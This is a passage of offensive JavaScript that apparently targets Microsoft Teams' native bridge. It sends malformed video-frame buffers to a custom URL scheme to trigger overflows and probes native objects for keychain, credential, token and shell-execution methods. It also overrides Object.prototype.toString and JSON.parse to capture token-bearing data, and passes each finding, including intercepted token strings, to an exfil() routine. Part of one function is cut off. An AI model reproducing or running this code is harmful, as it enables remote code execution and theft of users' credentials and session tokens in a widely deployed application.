function testVideoFramePost() {
    log2('\n>>> POST to microsoft-teams-video-frame:');

    // Test 1: Crafted buffer with malformed header
    try {
        var buf1 = new ArrayBuffer(256);
        var view1 = new DataView(buf1);
        // Craft header: timestamp(8) + format(4) + width(4) + height(4) + frameByteLength(4) + strides(12)
        view1.setBigUint64(0, BigInt(0), true);  // timestamp
        view1.setUint32(8, 0xFFFFFFFF, true);    // invalid format
        view1.setUint32(12, 0xFFFFFFFF, true);   // width = MAX_UINT32
        view1.setUint32(16, 0xFFFFFFFF, true);   // height = MAX_UINT32
        view1.setUint32(20, 0xFFFFFFFF, true);   // frameByteLength = MAX (overflow!)
        view1.setUint32(24, 0xFFFFFFFF, true);   // lumaStride
        view1.setUint32(28, 0xFFFFFFFF, true);   // chromaStride
        view1.setUint32(32, 0xFFFFFFFF, true);   // stride

        fetch('microsoft-teams-video-frame:', {
            method: 'POST',
            body: buf1
        }).then(function(r) {
            exfil('rce_vf_post_malformed', 'status: ' + r.status);
            log2('  [+] Malformed header POST: status=' + r.status);
        }).catch(function(e) {
            exfil('rce_vf_post_malformed_err', String(e));
            log2('  [-] Malformed header POST error: ' + e);
        });
    } catch(e) {
        exfil('rce_vf_post_err1', String(e));
        log2('  Error: ' + e);
    }

    // Test 2: Empty buffer
    try {
        fetch('microsoft-teams-video-frame:', {
            method: 'POST',
            body: new ArrayBuffer(0)
        }).then(function(r) {
            exfil('rce_vf_post_empty', 'status: ' + r.status);
            log2('  [+] Empty buffer POST: status=' + r.status);
        }).catch(function(e) {
            exfil('rce_vf_post_empty_err', String(e));
            log2('  [-] Empty buffer error: ' + e);
        });
    } catch(e) {}

    // Test 3: Huge buffer (1MB)
    try {
        var bigBuf = new ArrayBuffer(1024 * 1024);
        var bigView = new Uint8Array(bigBuf);
        for (var i = 0; i < 36; i++) bigView[i] = 0xFF;

        fetch('microsoft-teams-video-frame:', {
            method: 'POST',
            body: bigBuf
        }).then(function(r) {
            exfil('rce_vf_post_1mb', 'status: ' + r.status);
            log2('  [+] 1MB buffer POST: status=' + r.status);
        }).catch(function(e) {
            exfil('rce_vf_post_1mb_err', String(e));
            log2('  [-] 1MB buffer error: ' + e);
        });
    } catch(e) {}

    // Test 4: Negative-like values in header (signed/unsigned confusion)
    try {
        var buf4 = new ArrayBuffer(256);
        var v4 = new DataView(buf4);
        v4.setBigUint64(0, BigInt(0), true);
        v4.setUint32(8, 1, true);            // format = NV12
        v4.setUint32(12, 1920, true);        // width = normal
        v4.setUint32(16, 1080, true);        // height = normal
        v4.setInt32(20, -1, true);           // frameByteLength = -1 (signed = 0xFFFFFFFF unsigned)
        v4.setUint32(24, 1920, true);
        v4.setUint32(28, 960, true);
        v4.setUint32(32, 1920, true);

        fetch('microsoft-teams-video-frame:', {
            method: 'POST',
            body: buf4
        }).then(function(r) {
            exfil('rce_vf_post_neg', 'status: ' + r.status);
            log2('  [+] Negative length POST: status=' + r.status);
        }).catch(function(e) {
            exfil('rce_vf_post_neg_err', String(e));
            log2('  [-] Negative length error: ' + e);
        });
    } catch(e) {}
}

        'loadURL', 'loadUrl', 'navigateToUrl', 'openUrl', 'openURL',
        'writeFile', 'readFile', 'deleteFile', 'downloadFile',
        'executeNative', 'callNative', 'nativeEval', 'bridgeEval',
        'sendNativeMessage', 'postNativeMessage', 'dispatchNativeEvent',
        'getKeychain', 'setKeychain', 'readKeychain',
        'getCredential', 'getPassword', 'getToken',
        'installApp', 'launchApp', 'execCommand', 'shellExec',
        'processData', 'parseData', 'deserialize'
    ];

    dangerousMethods.forEach(function(m) {
        try {
            if (typeof NI[m] === 'function') {
                exfil('rce_ni_dangerous_' + m, 'FOUND: function');
                log2('  [!!!] NI.' + m + ' EXISTS as function!');
            } else if (NI[m] !== undefined) {
                exfil('rce_ni_has_' + m, typeof NI[m]);
                log2('  [?] NI.' + m + ' = ' + typeof NI[m]);
            }
        } catch(e) {}
    });

    // Also check on videoExtHandler
    if (NI.videoExtHandler) {
        Object.getOwnPropertyNames(NI.videoExtHandler).forEach(function(p) {
            if (typeof NI.videoExtHandler[p] === 'function') {
                exfil('rce_veh_method_' + p, 'function');
                log2('  videoExtHandler.' + p + '()');
            }
        });

        // Check prototype chain
        var proto = Object.getPrototypeOf(NI.videoExtHandler);
        if (proto) {
            var protoMethods = Object.getOwnPropertyNames(proto).filter(function(p) {
                return typeof proto[p] === 'function' && p !== 'constructor';
            });
            exfil('rce_veh_proto', protoMethods);
            log2('  videoExtHandler prototype methods: ' + protoMethods.join(', '));
        }
    }

    log2('  Probe complete');
    exfil('rce_eval_probe_done', 'complete');
}

function testPrototypePollution() {
    log2('\n>>> Prototype pollution on native objects');

    // Try to override Object.prototype to intercept native calls
    try {
        var origToString = Object.prototype.toString;
        var interceptCount = 0;
        Object.prototype.toString = function() {
            interceptCount++;
            if (interceptCount <= 5) {
                try {
                    var keys = Object.keys(this);
                    if (keys.length > 0) {
                        exfil('rce_proto_intercept', {type: typeof this, keys: keys.slice(0, 10)});
                        log2('  [INTERCEPT] toString on: ' + keys.slice(0, 5).join(','));
                    }
                } catch(e) {}
            }
            return origToString.call(this);
        };
        log2('  [+] Object.prototype.toString overridden');

        // Trigger some native calls to see if our intercept catches anything
        if (NI) {
            NI.framelessPostMessage(JSON.stringify({
                func: 'getContext',
                id: 9800,
                args: []
            }));
            log2('  [+] Triggered getContext to test interception');
        }

        // Restore after 3 seconds
        setTimeout(function() {
            Object.prototype.toString = origToString;
            exfil('rce_proto_restore', 'intercepts: ' + interceptCount);
            log2('  Restored toString, intercepts: ' + interceptCount);
        }, 3000);
    } catch(e) {
        exfil('rce_proto_err', String(e));
        log2('  Error: ' + e);
    }

    // Try JSON.parse override to intercept native JSON responses
    try {
        var origParse = JSON.parse;
        JSON.parse = function(str) {
            var result = origParse.call(JSON, str);
            if (typeof str === 'string' && str.indexOf('token') !== -1) {
                exfil('rce_json_intercept_token', str.substring(0, 500));
                log2('  [JSON INTERCEPT] token-containing: ' + str.substring(0, 100));
            }
            return result;
        };
        log2('  [+] JSON.parse overridden — intercepting all JSON parsing');

        setTimeout(function() {
            JSON.parse = origParse;
            log2('  JSON.parse restored');
        }, 5000);
    } catch(e) {}
}
